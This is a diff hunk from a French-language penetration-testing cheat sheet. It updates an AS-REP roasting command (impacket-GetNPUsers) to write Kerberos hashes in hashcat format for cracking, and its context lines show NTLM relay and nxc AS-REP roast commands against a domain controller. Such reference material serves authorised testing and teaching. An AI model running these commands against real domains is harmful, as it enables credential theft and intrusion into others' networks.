@@ -68,7 +68,7 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 ### AS-REP roasting (comptes sans pré-authentification Kerberos)
 ```bash
 # Sans identifiant, si on a une liste d'utilisateurs
-impacket-GetNPUsers DOMAINE/ -usersfile users.txt -no-pass -dc-ip <DC>
+impacket-GetNPUsers DOMAINE/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <IP>
 # Avec un compte
 nxc ldap <DC> -u user -p pass --asreproast asrep.txt
 # Cassage
